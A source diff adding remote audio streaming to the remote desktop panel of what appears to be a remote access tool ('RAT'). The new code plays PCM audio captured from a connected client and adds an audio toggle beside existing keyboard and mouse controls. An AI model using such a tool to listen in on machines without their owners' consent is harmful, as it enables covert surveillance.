@@ -4,6 +4,8 @@ import { useParams } from "react-router-dom";
 import {
   startRemoteDesktopCmd,
   stopRemoteDesktopCmd,
+  startRemoteDesktopAudioCmd,
+  stopRemoteDesktopAudioCmd,
   fetchClientCmd,
   sendKeyboardInputCmd,
   sendMouseClickCmd,
@@ -17,6 +19,8 @@ import {
   IconShareplay,
   IconTerminal2,
   IconBrowser,
+  IconVolume,
+  IconVolumeOff,
 } from "@tabler/icons-react";
 import { RemoteDesktopFramePayload } from "../../types";
 import { RATContext } from "../rat/RATContext";
@@ -53,6 +57,12 @@ export const RemoteDesktop: React.FC = () => {
   const [ctrlKeyState, setCtrlKeyState] = useState(false);
 
   const [showKeyboardInfo, setShowKeyboardInfo] = useState(true);
+
+  // Audio streaming state
+  const [audioEnabled, setAudioEnabled] = useState(false);
+  const audioContextRef = useRef<AudioContext | null>(null);
+  const audioQueueRef = useRef<Float32Array[]>([]);
+  const isPlayingRef = useRef(false);
 
   useEffect(() => {
     lastFrameRef.current = new Image();
@@ -121,6 +131,92 @@ export const RemoteDesktop: React.FC = () => {
       unlisten.then((fn) => fn());
     };
   }, [selectedDisplay]);
+
+  // Audio streaming listener and playback
+  useEffect(() => {
+    if (!audioEnabled || !addr) return;
+
+    const unlisten = listen("remote_desktop_audio_chunk", (event: any) => {
+      const payload = event.payload;
+      if (payload.addr !== addr) return;
+
+      try {
+        const audioData = atob(payload.data);
+        const bytes = new Uint8Array(audioData.length);
+        for (let i = 0; i < audioData.length; i++) {
+          bytes[i] = audioData.charCodeAt(i);
+        }
+
+        // Convert PCM i16 to Float32
+        const samples = new Float32Array(bytes.length / 2);
+        const dataView = new DataView(bytes.buffer);
+        for (let i = 0; i < samples.length; i++) {
+          samples[i] = dataView.getInt16(i * 2, true) / 32768.0;
+        }
+
+        audioQueueRef.current.push(samples);
+        playNextAudioChunk(payload.sampleRate, payload.channels);
+      } catch (e) {
+        console.error("Audio decode error:", e);
+      }
+    });
+
+    return () => {
+      unlisten.then((fn) => fn());
+    };
+  }, [audioEnabled, addr]);
+
+  const playNextAudioChunk = (sampleRate: number, channels: number) => {
+    if (isPlayingRef.current || audioQueueRef.current.length === 0) return;
+
+    try {
+      if (!audioContextRef.current) {
+        audioContextRef.current = new AudioContext({ sampleRate });
+      }
+
+      const ctx = audioContextRef.current;
+      const samples = audioQueueRef.current.shift()!;
+
+      const buffer = ctx.createBuffer(channels, samples.length, sampleRate);
+      for (let ch = 0; ch < channels; ch++) {
+        buffer.copyToChannel(samples, ch);
+      }
+
+      const source = ctx.createBufferSource();
+      source.buffer = buffer;
+      source.connect(ctx.destination);
+      source.onended = () => {
+        isPlayingRef.current = false;
+        playNextAudioChunk(sampleRate, channels);
+      };
+
+      isPlayingRef.current = true;
+      source.start();
+    } catch (e) {
+      console.error("Audio playback error:", e);
+      isPlayingRef.current = false;
+    }
+  };
+
+  const toggleAudio = async () => {
+    if (!addr) return;
+
+    if (audioEnabled) {
+      await stopRemoteDesktopAudioCmd(addr);
+      setAudioEnabled(false);
+
+      // Cleanup audio context
+      if (audioContextRef.current) {
+        audioContextRef.current.close();
+        audioContextRef.current = null;
+      }
+      audioQueueRef.current = [];
+      isPlayingRef.current = false;
+    } else {
+      await startRemoteDesktopAudioCmd(addr);
+      setAudioEnabled(true);
+    }
+  };
 
   useEffect(() => {
     if (!streaming || !keyboardControlEnabled || !addr) return;
@@ -518,6 +614,30 @@ export const RemoteDesktop: React.FC = () => {
             color={keyboardControlEnabled ? "black" : "white"}
             className={!streaming ? "opacity-50" : ""}
           />
+        </button>
+
+        <button
+          className={`p-3 rounded-xl shadow-lg backdrop-blur-md transition-all duration-200 cursor-pointer ${
+            audioEnabled
+              ? "bg-white bg-opacity-90"
+              : "bg-secondarybg bg-opacity-80"
+          } ${!streaming ? "opacity-50" : ""}`}
+          onClick={toggleAudio}
+          onMouseEnter={() =>
+            showToolTip(
+              audioEnabled
+                ? "Disable Audio"
+                : "Enable Audio"
+            )
+          }
+          onMouseLeave={hideTooltip}
+          disabled={!streaming}
+        >
+          {audioEnabled ? (
+            <IconVolume size={24} color="black" />
+          ) : (
+            <IconVolumeOff size={24} color="white" />
+          )}
         </button>
 
         <div className="w-full h-[1px] bg-white bg-opacity-20 my-1" />
